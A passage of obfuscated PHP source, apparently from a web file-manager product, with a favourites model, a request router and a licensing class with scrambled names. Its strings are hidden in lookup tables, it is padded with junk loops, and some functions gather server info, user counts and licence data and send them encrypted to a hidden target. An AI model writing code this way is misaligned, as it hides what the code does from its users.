"\x75\163\x65\x72\137\146\x61\x76"; protected function cacheFunctionAlias($¾ı‰Ö…) { $ùùËÇ‘„ =& $_SERVER[´È¥ö†ö]; return array($ùùËÇ‘„[2089] => array(USER_ID, $ùùËÇ‘„[2459])); } protected function listData() { $å•šñÓ± =& $_SERVER[´È¥ö†ö]; $ÓÔ¦„òü = array($å•šñÓ±[1764] => USER_ID, $å•šñÓ±[568] => 0); $°¹Õâ¹» = $å•šñÓ±[2460]; $«†¡Æ·Å = $this->field($°¹Õâ¹»)->where($ÓÔ¦„òü)->order($å•šñÓ±[2461])->select(); return $«†¡Æ·Å ? $«†¡Æ·Å : array(); } protected function resetCache() { } protected function listView() { $»’‡¹ä =& $_SERVER[´È¥ö†ö]; $…ªœ­µ  = $this->listData(); $¾îÃØ”ù = array_filter_by_field($…ªœ­µ , $»’‡¹ä[33], $»’‡¹ä[501]); $€ñº³é = array_to_keyvalue($¾îÃØ”ù, $»’‡¹ä[12], $»’‡¹ä[87]); if (!$€ñº³é) { return $…ªœ­µ ; } $ıÀù›ú¾ = 2000; $İ¸ˆêê¦ = array($»’‡¹ä[502] => array($»’‡¹ä[503], $€ñº³é)); $ÅËÇÅ× = Model($»’‡¹ä[901])->listSource($İ¸ˆêê¦, $ıÀù›ú¾); $ÅËÇÅ× = array_merge($ÅËÇÅ×[$»’‡¹ä[86]], $ÅËÇÅ×[$»’‡¹ä[85]]); $ÅËÇÅ× = array_to_keyvalue($ÅËÇÅ×, $»’‡¹ä[193]); foreach ($…ªœ­µ  as $³›£Â  => $öúµ¨¨ß) { $Ôóõ„¶ = $ÅËÇÅ×[$öúµ¨¨ß[$»’‡¹ä[87]]]; $Ôóõ„¶ = $Ôóõ„¶ ? $Ôóõ„¶ : array(); $…ªœ­µ [$³›£Â ] = array_merge($Ôóõ„¶, $öúµ¨¨ß); } return $…ªœ­µ ; } protected function addFav($ÜàÖªĞ¹, $øüéëûü = '', $Ó¡›ñœ¿ = "\x73\x6f\165\x72\143\x65") { $Æ¥÷å®ı =& $_SERVER[´È¥ö†ö]; $µ«ƒÃë = array($Æ¥÷å®ı[1764] => USER_ID, $Æ¥÷å®ı[568] => 0, $Æ¥÷å®ı[507] => $Ó¡›ñœ¿, $Æ¥÷å®ı[506] => $ÜàÖªĞ¹); if ($this->where($µ«ƒÃë)->find()) { return !1; } $µ«ƒÃë = array($Æ¥÷å®ı[1764] => USER_ID, $Æ¥÷å®ı[568] => 0); $ŞªÇ¸¹½ = $this->where($µ«ƒÃë)->max($Æ¥÷å®ı[1998]); if (!$ŞªÇ¸¹½) { $ŞªÇ¸¹½ = 0; } if (!$øüéëûü && $Ó¡›ñœ¿ == $Æ¥÷å®ı[501]) { $µÀñùŸ = Model($Æ¥÷å®ı[1420])->where(array($Æ¥÷å®ı[502] => $ÜàÖªĞ¹))->find(); if (!$µÀñùŸ) { return !1; } $øüéëûü = $µÀñùŸ[$Æ¥÷å®ı[32]]; } $øüéëûü = $this->getAutoName($øüéëûü); $¤ÚÇßã = array($Æ¥÷å®ı[1764] => USER_ID, $Æ¥÷å®ı[568] => 0, $Æ¥÷å®ı[505] => $øüéëûü, $Æ¥÷å®ı[506] => $ÜàÖªĞ¹, $Æ¥÷å®ı[507] => $Ó¡›ñœ¿, $Æ¥÷å®ı[1978] => $ŞªÇ¸¹½ + 1); return $this->add($¤ÚÇßã); } protected function remove($‘˜˜±ğ…) { $ÎÊ—‹›ù =& $_SERVER[´È¥ö†ö]; $¿¨¼µ¬» = array($ÎÊ—‹›ù[1764] => USER_ID, $ÎÊ—‹›ù[504] => $‘˜˜±ğ…); return $this->where($¿¨¼µ¬»)->delete(); } protected function removeByName($î¦ı“ô) { $Íˆª§‡ö =& $_SERVER[´È¥ö†ö]; $üƒ ‘‚Ê = array($Íˆª§‡ö[1764] => USER_ID, $Íˆª§‡ö[505] => $î¦ı“ô, $Íˆª§‡ö[568] => 0); return $this->where($üƒ ‘‚Ê)->delete(); } protected function rename($¹¼´ã£’, $ÉöôÄî“) { $ôà¯ö´î =& $_SERVER[´È¥ö†ö]; if ($¹¼´ã£’ == $ÉöôÄî“) { return !1; } $—ªõ´° = $this->getAutoName($ÉöôÄî“); if ($ÉöôÄî“ != $—ªõ´°) { return !1; } $ª—Ô¥ç = array($ôà¯ö´î[1764] => USER_ID, $ôà¯ö´î[568] => 0, $ôà¯ö´î[32] => $¹¼´ã£’); return $this->where($ª—Ô¥ç)->save(array($ôà¯ö´î[32] => $ÉöôÄî“)); } protected function resetSort($ù¯Ä·¼) { $Íáà€ÌË =& $_SERVER[´È¥ö†ö]; $ù¯Ä·¼ = is_array($ù¯Ä·¼) ? $ù¯Ä·¼ : array(); $×öğÁŒ¬ = array($Íáà€ÌË[1764] => USER_ID); for ($ıŠ‘æÀ = 0; $ıŠ‘æÀ < count($ù¯Ä·¼); $ıŠ‘æÀ++) { $×öğÁŒ¬[$Íáà€ÌË[504]] = $ù¯Ä·¼[$ıŠ‘æÀ]; $this->where($×öğÁŒ¬)->save(array($Íáà€ÌË[1978] => $ıŠ‘æÀ + 1)); } return !0; } protected function moveTop($¦‡õ§ş¯) { $•©Øí’Ç =& $_SERVER[´È¥ö†ö]; $¯µ¨ªë¥ = array($•©Øí’Ç[1764] => USER_ID, $•©Øí’Ç[568] => 0); $……áÆÚš = $this->where($¯µ¨ªë¥)->where(array($•©Øí’Ç[32] => $¦‡õ§ş¯))->find(); if (!$……áÆÚš) { return; } $¥‚Ñ¿ñÇ = $this->field($•©Øí’Ç[486])->where($¯µ¨ªë¥)->order($•©Øí’Ç[2461])->select(); $¥‚Ñ¿ñÇ = array_to_keyvalue($¥‚Ñ¿ñÇ, $•©Øí’Ç[12], $•©Øí’Ç[486]); $ô‹Íä£ = $¥‚Ñ¿ñÇ; $¥‚Ñ¿ñÇ = array_remove_value($¥‚Ñ¿ñÇ, $……áÆÚš[$•©Øí’Ç[486]]); array_unshift($¥‚Ñ¿ñÇ, $……áÆÚš[$•©Øí’Ç[486]]); return $this->resetSort($¥‚Ñ¿ñÇ); } protected function moveBottom($™Ö‡±…Œ) { $è¥ÆÖ—² =& $_SERVER[´È¥ö†ö]; $ğÒ­Ò·Œ = array($è¥ÆÖ—²[1764] => USER_ID, $è¥ÆÖ—²[568] => 0); $§š™Êùœ = $this->where($ğÒ­Ò·Œ)->max($è¥ÆÖ—²[1998]); $¾‡»É— = array($è¥ÆÖ—²[1998] => $§š™Êùœ + 1); return $this->where($ğÒ­Ò·Œ)->where(array($è¥ÆÖ—²[32] => $™Ö‡±…Œ))->save($¾‡»É—); } private function getAutoName($­”¾™’) { $åß¢Ô¨æ =& $_SERVER[´È¥ö†ö]; $ìÌ€ÒĞá = array($åß¢Ô¨æ[1764] => USER_ID, $åß¢Ô¨æ[568] => 0); $Æ««—©ª = $this->field($åß¢Ô¨æ[32])->where($ìÌ€ÒĞá)->select(); $Æ««—©ª = array_to_keyvalue($Æ««—©ª, $åß¢Ô¨æ[12], $åß¢Ô¨æ[32]); if (!$Æ««—©ª || !in_array($­”¾™’, $Æ««—©ª)) { return $­”¾™’; } for ($¶ö˜Ú¾ = 0; $¶ö˜Ú¾ < count($Æ««—©ª); $¶ö˜Ú¾++) { if (!in_array($­”¾™’ . "\x28{$¶ö˜Ú¾}\51", $Æ««—©ª)) { return $­”¾™’ . "\50{$¶ö˜Ú¾}\51"; } } return $­”¾™’ . "\50{$¶ö˜Ú¾}\x29"; } } goto eÌáÉ“ÑâÉ; f¯“‰‡¬£: while ($aqncroilsk < $_SERVER[´È¥ö†ö][697]) { if ($aqncroilsk >= 0) { break; } $aqncroilsk++; } class Application { private $defaultModule = "\151\156\x64\x65\170"; private $defaultController = "\x69\156\144\x65\170"; private $defaultAction = "\x69\x6e\144\x65\x78"; function __construct() { } public function setDefault($¯äÑ£İ«) { $½¸†âÔá =& $_SERVER[´È¥ö†ö]; $çÕ¬¯ûØ =& $_SERVER[–®Á¾äİ]; $…÷à­È™ = explode($çÕ¬¯ûØ[0], trim($¯äÑ£İ«, $çÕ¬¯ûØ[0])); $‡’å«ˆˆ = $½¸†âÔá[698]; if (!$‡’å«ˆˆ) { return; } $this->defaultModule = $…÷à­È™[0] ? $…÷à­È™[0] : $this->defaultModule; $¶ÁÏŸµ† = $½¸†âÔá[699]; if (strlen($¶ÁÏŸµ†) < $½¸†âÔá[697]) { die; } $this->defaultController = $…÷à­È™[1] ? $…÷à­È™[1] : $this->defaultController; $‹Ñ Ïø = $½¸†âÔá[700]; if (!$‹Ñ Ïø) { return; } $this->defaultAction = $…÷à­È™[2] ? $…÷à­È™[2] : $this->defaultAction; $×šï‚Ë˜ = $½¸†âÔá[701]; while ($×šï‚Ë˜ < $½¸†âÔá[702]) { if ($×šï‚Ë˜ >= 0) { break; } $×šï‚Ë˜++; } $this->ojdve148932f($çÕ¬¯ûØ[1], array($this, $çÕ¬¯ûØ[2])); $âêùèÍ¬ = $½¸†âÔá[703]; while ($âêùèÍ¬ < $½¸†âÔá[697]) { if ($âêùèÍ¬ >= 0) { break; } $âêùèÍ¬++; } } public function appRun($¦œÊùÀœ) { $µ…¥¶«› =& $_SERVER[´È¥ö†ö]; $©ÈûÅèÙ =& $_SERVER[–®Á¾äİ]; $‹£ñ•Òì = explode($©ÈûÅèÙ[0], $¦œÊùÀœ); $å§Û©¾ = $µ…¥¶«›[704]; while (strlen($å§Û©¾) < $µ…¥¶«›[705]) { if (!$å§Û©¾) { break; } $å§Û©¾++; } $ÏÁÚŠ¦© = strtolower($‹£ñ•Òì[0]); $œÖÔ‡†û = $µ…¥¶«›[706]; $ÒÍ­»¦ = $©ÈûÅèÙ[3]; $ö’ü…È = $µ…¥¶«›[707]; if ($ÏÁÚŠ¦© == $©ÈûÅèÙ[4]) { $ÒÍ­»¦ = $©ÈûÅèÙ[5]; $‹£ñ•Òì[0] = $©ÈûÅèÙ[6]; $‹£ñ•Òì[1] = $‹£ñ•Òì[1] . $©ÈûÅèÙ[7]; $¦œÊùÀœ = join($©ÈûÅèÙ[0], $‹£ñ•Òì); $¦œÊùÀœ = trim($¦œÊùÀœ, $©ÈûÅèÙ[0]); } call_user_func(array($©ÈûÅèÙ[8], $©ÈûÅèÙ[9]), $ÒÍ­»¦ . $©ÈûÅèÙ[10], $¦œÊùÀœ); ActionCall($¦œÊùÀœ); $¹¹Ò¿ÊÓ = $µ…¥¶«›[708]; if (!$¹¹Ò¿ÊÓ) { die; } call_user_func(array($©ÈûÅèÙ[8], $©ÈûÅèÙ[9]), $ÒÍ­»¦ . $©ÈûÅèÙ[11], $¦œÊùÀœ); } private function autorun() { $ØàÌ¿êÁ =& $_SERVER[–®Á¾äİ]; global $config; if (count($config[$ØàÌ¿êÁ[12]]) == 0) { return; } foreach ($config[$ØàÌ¿êÁ[12]] as $İÌÍ§µœ => $—Àæ¤£) { $this->appRun($—Àæ¤£); } } private function gcfp0255e4b8() { $Åí«šïÄ =& $_SERVER[´È¥ö†ö]; $‚ÚÄ‘Œ² =& $_SERVER[–®Á¾äİ]; $¸ùÚÑ°í = $‚ÚÄ‘Œ²[4]; $í”ºé† = $Åí«šïÄ[709]; if (strlen($í”ºé†) < $Åí«šïÄ[705]) { return; } $¬ ‘¬ú³ = $GLOBALS[$‚ÚÄ‘Œ²[13]][$‚ÚÄ‘Œ²[14]][0]; if (!$¬ ‘¬ú³ || strlen($¬ ‘¬ú³) <= strlen($¸ùÚÑ°í)) { return; } if (strtolower(substr($¬ ‘¬ú³, -strlen($¸ùÚÑ°í))) != $¸ùÚÑ°í) { return; } $»À‰ÇÁÉ = substr($¬ ‘¬ú³, 0, -strlen($¸ùÚÑ°í)); $­œ¸çù› = $Åí«šïÄ[710]; if (strlen($­œ¸çù›) < $Åí«šïÄ[705]) { return; } $æöÊÅãì = array($‚ÚÄ‘Œ²[4], $»À‰ÇÁÉ); $–ÑöäÒÚ = array_slice($GLOBALS[$‚ÚÄ‘Œ²[13]][$‚ÚÄ‘Œ²[14]], 1); $GLOBALS[$‚ÚÄ‘Œ²[13]][$‚ÚÄ‘Œ²[14]] = array_merge($æöÊÅãì, $–ÑöäÒÚ); $GLOBALS[$‚ÚÄ‘Œ²[13]][$‚ÚÄ‘Œ²[15]] = implode($‚ÚÄ‘Œ²[0], $GLOBALS[$‚ÚÄ‘Œ²[13]][$‚ÚÄ‘Œ²[14]]); $æ‹ÖİÀ÷ = $Åí«šïÄ[711]; } private function lfuk4879a207() { $ˆ½ÌÅÉÁ =& $_SERVER[´È¥ö†ö]; $àãš›ãã =& $_SERVER[–®Á¾äİ]; if ($GLOBALS[$àãš›ãã[13]][$àãš›ãã[15]] != $àãš›ãã[6]) { return; } $ëĞïƒûÆ = $_SERVER[$àãš›ãã[16]]; $ÊŠÓ‹ò = $ˆ½ÌÅÉÁ[712]; if (!$ÊŠÓ‹ò) { return; } $Õ¯ı–¤“ = $àãš›ãã[17]; if (!strstr($ëĞïƒûÆ, $Õ¯ı–¤“)) { return; } $ôÒ¯é¨õ = strrpos($ëĞïƒûÆ, $Õ¯ı–¤“); $Ğ˜¿ğ¬¤ = $ˆ½ÌÅÉÁ[713]; while (strlen($Ğ˜¿ğ¬¤) < $ˆ½ÌÅÉÁ[697]) { if (!$Ğ˜¿ğ¬¤) { break; } $Ğ˜¿ğ¬¤++; } $ïøÛ°Üö = substr($ëĞïƒûÆ, $ôÒ¯é¨õ + strlen($Õ¯ı–¤“)); preg_match_all($àãš›ãã[18], $ïøÛ°Üö, $±–¥±³¼); $ïøÛ°Üö = trim($±–¥±³¼[0][0], $àãš›ãã[19]); $GLOBALS[$àãš›ãã[13]][$àãš›ãã[14]] = explode($àãš›ãã[19], $ïøÛ°Üö); $ˆĞ€¿éÃ = $ˆ½ÌÅÉÁ[714]; if (!$ˆĞ€¿éÃ) { die; } $GLOBALS[$àãš›ãã[13]][$àãš›ãã[15]] = implode($àãš›ãã[0], $GLOBALS[$àãš›ãã[13]][$àãš›ãã[14]]); } public function run() { $Ÿ¹Üûô =& $_SERVER[´È¥ö†ö]; $´¿åû­’ =& $_SERVER[–®Á¾äİ]; $this->lfuk4879a207(); $this->gcfp0255e4b8(); $úêõì£› = $Ÿ¹Üûô[715]; if (strlen($úêõì£›) < $Ÿ¹Üûô[313]) { die; } $úŸÜÉÁ÷ = $GLOBALS[$´¿åû­’[13]][$´¿åû­’[14]]; $ÄÌ¨úˆœ = $Ÿ¹Üûô[716]; if (strlen($ÄÌ¨úˆœ) < $Ÿ¹Üûô[702]) { return; } $›öâ‹¬§ = $GLOBALS[$´¿åû­’[13]][$´¿åû­’[15]]; define($´¿åû­’[20], isset($úŸÜÉÁ÷[0]) && $úŸÜÉÁ÷[0] ? $úŸÜÉÁ÷[0] : $this->defaultModule); define($´¿åû­’[21], isset($úŸÜÉÁ÷[1]) && $úŸÜÉÁ÷[0] ? $úŸÜÉÁ÷[1] : $this->defaultController); $ÌÁİó™Œ = $Ÿ¹Üûô[717]; if (!$ÌÁİó™Œ) { die; } define($´¿åû­’[22], isset($úŸÜÉÁ÷[2]) && $úŸÜÉÁ÷[0] ? $úŸÜÉÁ÷[2] : $this->defaultAction); $Ç¶Ú˜”æ = $Ÿ¹Üûô[718]; if (!$Ç¶Ú˜”æ) { return; } define($´¿åû­’[23], MOD . $´¿åû­’[0] . ST . $´¿åû­’[0] . ACT); $Ê‘±ûÛ  = $Ÿ¹Üûô[719]; if (strlen($Ê‘±ûÛ ) < $Ÿ¹Üûô[720]) { die; } $_SERVER[$´¿åû­’[24]] = strtolower(ACTION); $÷¥œ¯× = $Ÿ¹Üûô[721]; if (!$÷¥œ¯×) { die; } $this->autorun(); if (count($úŸÜÉÁ÷) >= 3) { $this->appRun($›öâ‹¬§); } else { $this->appRun(ACTION); } } private $borxadd61fc3 = array(); private $tihkeb32dd7b = ''; public function duvk0b042022() { $Äò×Ş „ =& $_SERVER[´È¥ö†ö]; $¾˜˜›§ =& $_SERVER[–®Á¾äİ]; $this->iukn7dd5c9a9(); $this->izcp910c921b(); $this->ynshb840460e(); $this->elzhbe7c685d(); $…Ùš°¯ = $Äò×Ş „[722]; $this->gijofee7d298(); $¯¥„Ù‡€ = $Äò×Ş „[723]; $this->fuhed76a6532(); $ïêè°« = $Äò×Ş „[724]; if (!$ïêè°«) { return; } $this->vtlyeb40179c(); $¹øÒù½İ = $Äò×Ş „[725]; $this->ojdve148932f($¾˜˜›§[25], array($this, $¾˜˜›§[26])); $this->ojdve148932f($¾˜˜›§[27], array($this, $¾˜˜›§[28])); $¿ê•ˆÙ‰ = $Äò×Ş „[726]; while ($¿ê•ˆÙ‰ < $Äò×Ş „[702]) { if ($¿ê•ˆÙ‰ >= 0) { break; } $¿ê•ˆÙ‰++; } $this->ojdve148932f($¾˜˜›§[29], array($this, $¾˜˜›§[30])); $…†µ‡ = $Äò×Ş „[727]; if (!$…†µ‡) { die; } $this->ojdve148932f($¾˜˜›§[31], array($this, $¾˜˜›§[32])); } public function xcen7c5c040c($ØßŠ›İ¯) { $Ñ•½Ğñè =& $_SERVER[´È¥ö†ö]; $Œ‘±·Ï— =& $_SERVER[–®Á¾äİ]; $á˜˜ˆ‘© = Model($Œ‘±·Ï—[33])->get(); $‹ñÅÕ‰Õ = array($Œ‘±·Ï—[34], $Œ‘±·Ï—[35], $Œ‘±·Ï—[36], $Œ‘±·Ï—[37], $Œ‘±·Ï—[38], $Œ‘±·Ï—[39], $Œ‘±·Ï—[40], $Œ‘±·Ï—[41], $Œ‘±·Ï—[42], $Œ‘±·Ï—[43], $Œ‘±·Ï—[44], $Œ‘±·Ï—[45], $Œ‘±·Ï—[46], $Œ‘±·Ï—[47], $Œ‘±·Ï—[48], $Œ‘±·Ï—[49], $Œ‘±·Ï—[50], $Œ‘±·Ï—[51], $Œ‘±·Ï—[52], $Œ‘±·Ï—[53], $Œ‘±·Ï—[54], $Œ‘±·Ï—[55], $Œ‘±·Ï—[56], $Œ‘±·Ï—[57], $Œ‘±·Ï—[58], $Œ‘±·Ï—[59], $Œ‘±·Ï—[60], $Œ‘±·Ï—[61], $Œ‘±·Ï—[62], $Œ‘±·Ï—[63], $Œ‘±·Ï—[64], $Œ‘±·Ï—[65], $Œ‘±·Ï—[66], $Œ‘±·Ï—[67], $Œ‘±·Ï—[68], $Œ‘±·Ï—[69], $Œ‘±·Ï—[70], $Œ‘±·Ï—[71], $Œ‘±·Ï—[72], $Œ‘±·Ï—[73], $Œ‘±·Ï—[74], $Œ‘±·Ï—[75], $Œ‘±·Ï—[76], $Œ‘±·Ï—[77], $Œ‘±·Ï—[78], $Œ‘±·Ï—[79], $Œ‘±·Ï—[80], $Œ‘±·Ï—[81], $Œ‘±·Ï—[82], $Œ‘±·Ï—[83], $Œ‘±·Ï—[84], $Œ‘±·Ï—[85]); $ûø¤©îˆ = $Ñ•½Ğñè[728]; while (strlen($ûø¤©îˆ) < $Ñ•½Ğñè[720]) { if (!$ûø¤©îˆ) { break; } $ûø¤©îˆ++; } foreach ($‹ñÅÕ‰Õ as $½„²÷åŸ) { $„¹øàÍâ = $GLOBALS[$Œ‘±·Ï—[86]][$Œ‘±·Ï—[87]][$½„²÷åŸ]; if (isset($á˜˜ˆ‘©[$½„²÷åŸ])) { $„¹øàÍâ = $á˜˜ˆ‘©[$½„²÷åŸ]; } $ØßŠ›İ¯[$Œ‘±·Ï—[88]][$Œ‘±·Ï—[89]][$½„²÷åŸ] = $„¹øàÍâ; } $¬é·’ñÖ = $ØßŠ›İ¯[$Œ‘±·Ï—[88]][$Œ‘±·Ï—[89]][$Œ‘±·Ï—[46]]; $¶ÂÆÙº¥ = $Ñ•½Ğñè[729]; unset($ØßŠ›İ¯[$Œ‘±·Ï—[88]][$Œ‘±·Ï—[90]][$Œ‘±·Ï—[91]]); $æ¯›Áş = $Ñ•½Ğñè[730]; if (!$æ¯›Áş) { die; } unset($ØßŠ›İ¯[$Œ‘±·Ï—[88]][$Œ‘±·Ï—[90]][$Œ‘±·Ï—[92]]); unset($ØßŠ›İ¯[$Œ‘±·Ï—[88]][$Œ‘±·Ï—[89]][$Œ‘±·Ï—[46]]); $¶‘ğˆè = $Ñ•½Ğñè[731]; if (!$¶‘ğˆè) { return; } unset($ØßŠ›İ¯[$Œ‘±·Ï—[88]][$Œ‘±·Ï—[89]][$Œ‘±·Ï—[93]]); $ØßŠ›İ¯[$Œ‘±·Ï—[88]][$Œ‘±·Ï—[89]][$Œ‘±·Ï—[94]] = array($Œ‘±·Ï—[95] => (int) $¬é·’ñÖ[$Œ‘±·Ï—[96]], $Œ‘±·Ï—[97] => (int) _get($¬é·’ñÖ, $Œ‘±·Ï—[98], 0)); $ÇÏáÊª€ = $Ñ•½Ğñè[732]; while ($ÇÏáÊª€ < $Ñ•½Ğñè[313]) { if ($ÇÏáÊª€ >= 0) { break; } $ÇÏáÊª€++; } $íø™Îï = substr(md5($Œ‘±·Ï—[99] . get_client_ip() . $á˜˜ˆ‘©[$Œ‘±·Ï—[100]]), 0, 15); $ØßŠ›İ¯[$Œ‘±·Ï—[101]][$Œ‘±·Ï—[102]] = Mcrypt::encode(Session::sign(), $íø™Îï, 3600 * 24); $ØßŠ›İ¯[$Œ‘±·Ï—[101]][$Œ‘±·Ï—[103]] = Action($Œ‘±·Ï—[104])->accessToken(); $¨æ”¶‰† = $Ñ•½Ğñè[733]; if (strlen($¨æ”¶‰†) < $Ñ•½Ğñè[702]) { return; } $ØßŠ›İ¯[$Œ‘±·Ï—[101]][$Œ‘±·Ï—[105]] = md5($_SERVER[$Œ‘±·Ï—[106]] . $á˜˜ˆ‘©[$Œ‘±·Ï—[100]]); $ØßŠ›İ¯[$Œ‘±·Ï—[101]][$Œ‘±·Ï—[107]] = base64_encode(serverInfo()); $‹œ‚ıè— = $Ñ•½Ğñè[734]; if (!$‹œ‚ıè—) { return; } $ØßŠ›İ¯[$Œ‘±·Ï—[101]][$Œ‘±·Ï—[108]] = $this->tihkeb32dd7b; if ($á˜˜ˆ‘©[$Œ‘±·Ï—[108]] != $Œ‘±·Ï—[109]) { $ØßŠ›İ¯[$Œ‘±·Ï—[101]][$Œ‘±·Ï—[110]] = $á˜˜ˆ‘©[$Œ‘±·Ï—[110]]; $ØßŠ›İ¯[$Œ‘±·Ï—[101]][$Œ‘±·Ï—[111]] = $á˜˜ˆ‘©[$Œ‘±·Ï—[111]]; $÷öŞú›· = rand_string(10) . $this->tihkeb32dd7b . rand_string(5); $ØßŠ›İ¯[$Œ‘±·Ï—[88]][$Œ‘±·Ï—[112]][$Œ‘±·Ï—[113]] = $this->hvxk869b1600($÷öŞú›·, $ØßŠ›İ¯[$Œ‘±·Ï—[101]][$Œ‘±·Ï—[105]]); } if ($this->tihkeb32dd7b == $Œ‘±·Ï—[109]) { $ØßŠ›İ¯[$Œ‘±·Ï—[88]][$Œ‘±·Ï—[89]][$Œ‘±·Ï—[94]][$Œ‘±·Ï—[98]] = 0; } $ØßŠ›İ¯[$Œ‘±·Ï—[101]][$Œ‘±·Ï—[114]] = $this->versionPluginFilter(); $ØßŠ›İ¯[$Œ‘±·Ï—[101]][$Œ‘±·Ï—[115]] = _get($this->borxadd61fc3, $Œ‘±·Ï—[116], $Œ‘±·Ï—[6]); $¿­½†Î = $Ñ•½Ğñè[735]; if (KodUser::isRoot() && $this->config[$Œ‘±·Ï—[117]]) { $ØßŠ›İ¯[$Œ‘±·Ï—[101]][$Œ‘±·Ï—[118]] = WEB_ROOT; } return $ØßŠ›İ¯; } private function fuhed76a6532() { $ ­Î¨¢ =& $_SERVER[´È¥ö†ö]; $Âú½ƒ¹ =& $_SERVER[–®Á¾äİ]; $†ñ×É˜ = $_SERVER[$Âú½ƒ¹[24]] == $Âú½ƒ¹[119]; if ($_SERVER[$Âú½ƒ¹[24]] == $Âú½ƒ¹[120] && $_GET[$Âú½ƒ¹[121]] == $Âú½ƒ¹[122]) { $†ñ×É˜ = !0; } if ($†ñ×É˜) { $úÕŞš€ö = array($Âú½ƒ¹[108] => $this->tihkeb32dd7b, $Âú½ƒ¹[123] => $this->yrva480773e7(), $Âú½ƒ¹[124] => Model($Âú½ƒ¹[125])->count()); if ($this->tihkeb32dd7b != $Âú½ƒ¹[109]) { $Ø›ËüÍ  = _get($this->borxadd61fc3, $Âú½ƒ¹[126]); if ($Ø›ËüÍ ) { $úÕŞš€ö[$Âú½ƒ¹[127]] = $Ø›ËüÍ ; $úÕŞš€ö[$Âú½ƒ¹[128]] = strtotime(_get($this->borxadd61fc3, $Âú½ƒ¹[129])); $úÕŞš€ö[$Âú½ƒ¹[130]] = _get($this->borxadd61fc3, $Âú½ƒ¹[116]); } $æ€é±±“ = Model($Âú½ƒ¹[33])->get($Âú½ƒ¹[131], $Âú½ƒ¹[6], !0); if (is_string($æ€é±±“) && substr($æ€é±±“, 0, 1) == $Âú½ƒ¹[132]) { $æ€é±±“ = json_decode_force($æ€é±±“); } if (is_array($æ€é±±“) && $æ€é±±“[$Âú½ƒ¹[133]] && strstr($æ€é±±“[$Âú½ƒ¹[133]], $Âú½ƒ¹[134])) { $òŠÈÉ»Ã = explode($Âú½ƒ¹[134], $æ€é±±“[$Âú½ƒ¹[133]]); $úÕŞš€ö[$Âú½ƒ¹[135]] = $òŠÈÉ»Ã[0]; } } $úÕŞš€ö = $this->lunt9121f6a1(json_encode($úÕŞš€ö), md5($Âú½ƒ¹[136])); $êÕì¨Øë = array($Âú½ƒ¹[137] => $úÕŞš€ö); $éÙÙÒ¯ = $ ­Î¨¢[736]; if (strlen($éÙÙÒ¯) < $ ­Î¨¢[720]) { return; } call_user_func(array($Âú½ƒ¹[138], $Âú½ƒ¹[139]), $êÕì¨Øë); } if ($this->tihkeb32dd7b == $Âú½ƒ¹[109]) { return; } $Îò’æãÜ = array($Âú½ƒ¹[140], $Âú½ƒ¹[141], $Âú½ƒ¹[142], $Âú½ƒ¹[143], $Âú½ƒ¹[144], $Âú½ƒ¹[145]); $¸£Öö‰Ê = Model($Âú½ƒ¹[33])->get(); $êÕì¨Øë = array($Âú½ƒ¹[146] => $¸£Öö‰Ê[$Âú½ƒ¹[34]], $Âú½ƒ¹[147] => $¸£Öö‰Ê[$Âú½ƒ¹[35]], $Âú½ƒ¹[148] => $Âú½ƒ¹[6]); $šÆ»Íø = $ ­Î¨¢[737]; if (!$šÆ»Íø) { return; } foreach ($Îò’æãÜ as $§áöÆ™) { if (!isset($¸£Öö‰Ê[$§áöÆ™]) || !$¸£Öö‰Ê[$§áöÆ™]) { continue; } $êÕì¨Øë[$§áöÆ™] = $¸£Öö‰Ê[$§áöÆ™]; $£ª‚ùÀ = $ ­Î¨¢[738]; if (strlen($£ª‚ùÀ) < $ ­Î¨¢[720]) { return; } } call_user_func(array($Âú½ƒ¹[138], $Âú½ƒ¹[139]), $êÕì¨Øë); } private function elzhbe7c685d() { $Ú™ÕÕÃù =& $_SERVER[´È¥ö†ö]; $›¡­¶¾¢ =& $_SERVER[–®Á¾äİ]; if ($_SERVER[$›¡­¶¾¢[24]] != $›¡­¶¾¢[149]) { return; } if (!KodUser::isRoot()) { die; } $Ï™Òæö = $GLOBALS[$›¡­¶¾¢[13]]; if (isset($Ï™Òæö[$›¡­¶¾¢[150]])) { $this->rpez8e1950d1(); die; } if (isset($Ï™Òæö[$›¡­¶¾¢[151]]) && isset($Ï™Òæö[$›¡­¶¾¢[151]]) == $›¡­¶¾¢[122]) { $Ï™Òæö[$›¡­¶¾¢[152]] = Model($›¡­¶¾¢[33])->get($›¡­¶¾¢[153]); } if (!isset($Ï™Òæö[$›¡­¶¾¢[152]]) || strlen($Ï™Òæö[$›¡­¶¾¢[152]]) != 16) { show_json($›¡­¶¾¢[154] . $Ï™Òæö[$›¡­¶¾¢[152]], !1); } $©†Öíşª = Model($›¡­¶¾¢[33])->get($›¡­¶¾¢[100]); $ ×Ğ×üş = md5($_SERVER[$›¡­¶¾¢[106]] . $©†Öíşª); $‹ç‚½óœ = array($›¡­¶¾¢[152] => $Ï™Òæö[$›¡­¶¾¢[152]], $›¡­¶¾¢[155] => rand_string(16), $›¡­¶¾¢[156] => $›¡­¶¾¢[136], $›¡­¶¾¢[157] => $›¡­¶¾¢[158], $›¡­¶¾¢[159] => $_SERVER[$›¡­¶¾¢[160]], $›¡­¶¾¢[161] => $_SERVER[$›¡­¶¾¢[162]], $›¡­¶¾¢[163] => $_SERVER[$›¡­¶¾¢[164]], $›¡­¶¾¢[105] => $ ×Ğ×üş, $›¡­¶¾¢[165] => Model($›¡­¶¾¢[33])->get($›¡­¶¾¢[131])); if (isset($Ï™Òæö[$›¡­¶¾¢[151]]) && isset($Ï™Òæö[$›¡­¶¾¢[151]]) == $›¡­¶¾¢[122]) { $‹ç‚½óœ[$›¡­¶¾¢[151]] = md5($‹ç‚½óœ[$›¡­¶¾¢[152]] . $›¡­¶¾¢[166] . $‹ç‚½óœ[$›¡­¶¾¢[155]]); } if ($Ï™Òæö[$›¡­¶¾¢[167]] == $›¡­¶¾¢[168]) { $Ñ’şº… = $this->lunt9121f6a1($ ×Ğ×üş, $›¡­¶¾¢[169]); $ë¯ÁÄÅ = $this->hvxk869b1600(json_encode($‹ç‚½óœ), $ ×Ğ×üş . $›¡­¶¾¢[170], 3); $ë¯ÁÄÅ = $ë¯ÁÄÅ . $›¡­¶¾¢[171] . $_SERVER[$›¡­¶¾¢[160]]; $÷Ã ³¦ = $this->moau3fd5ec13($›¡­¶¾¢[172] . $Ñ’şº… . $›¡­¶¾¢[173] . $ë¯ÁÄÅ, -1); show_json($÷Ã ³¦, !0); } else { if ($Ï™Òæö[$›¡­¶¾¢[167]] == $›¡­¶¾¢[174]) { $‹‚¡ñÕ¢ = substr(md5($›¡­¶¾¢[175] . $ ×Ğ×üş), 12, 